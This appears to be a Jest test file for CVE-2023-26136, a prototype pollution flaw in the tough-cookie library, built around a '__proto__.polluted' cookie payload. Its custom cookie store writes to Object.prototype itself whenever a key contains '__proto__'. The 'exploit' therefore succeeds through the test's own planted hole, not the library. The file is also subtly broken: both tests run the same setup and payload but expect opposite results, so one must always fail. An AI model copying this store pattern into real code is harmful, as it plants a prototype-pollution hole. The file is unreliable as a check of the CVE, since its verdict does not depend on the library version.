const tough = require('../lib/cookie');

// Custom MemoryCookieStore class to facilitate testing
class CustomMemoryCookieStore extends tough.MemoryCookieStore {
    constructor() {
        super();
        this.cookies = {}; // Using a regular object for cookie storage
    }

    putCookie(cookie, cb) {
        const key = cookie.key;
        if (key.includes('__proto__')) {
            // Directly attempt prototype pollution
            Object.prototype.polluted = cookie.value;
        }
        this.cookies[key] = cookie;
        cb(null, cookie);
    }

    findCookie(domain, path, key, cb) {
        cb(null, this.cookies[key] || null);
    }

    getAllCookies(cb) {
        cb(null, Object.values(this.cookies));
    }
}

describe('CVE-2023-26136 Prototype Pollution Vulnerability', () => {
    let store;
    let jar;

    beforeEach(() => {
        store = new CustomMemoryCookieStore();
        jar = new tough.CookieJar(store, { rejectPublicSuffixes: false });
    });

    afterEach(() => {
        delete Object.prototype.polluted; // Clean up pollution after each test
    });

    test('should exploit prototype pollution in version 2.5.0', () => {
        console.log('Store prototype before exploit:', Object.getPrototypeOf(jar.store));
        console.log('Store cookies before exploit:', jar.store.cookies);

        try {
            // Attempt exploitation
            jar.setCookieSync('__proto__.polluted=exploit_success; Path=/', 'http://example.com');
        } catch (error) {
            console.error('Error adding cookie:', error.message);
        }

        console.log('Store prototype after exploit:', Object.getPrototypeOf(jar.store));
        console.log('Store cookies after exploit:', jar.store.cookies);

        // Verify exploitation
        expect({}.polluted).toBe('exploit_success');
    });

    test('should prevent prototype pollution in patched version', () => {
        console.log('Store prototype before test:', Object.getPrototypeOf(jar.store));
        console.log('Store cookies before test:', jar.store.cookies);

        try {
            // Attempt exploitation
            jar.setCookieSync('__proto__.polluted=exploit_success; Path=/', 'http://example.com');
        } catch (error) {
            console.error('Error adding cookie:', error.message);
        }

        console.log('Store prototype after test:', Object.getPrototypeOf(jar.store));
        console.log('Store cookies after test:', jar.store.cookies);

        // Verify that pollution did not occur
        expect({}.polluted).toBeUndefined();
    });
});
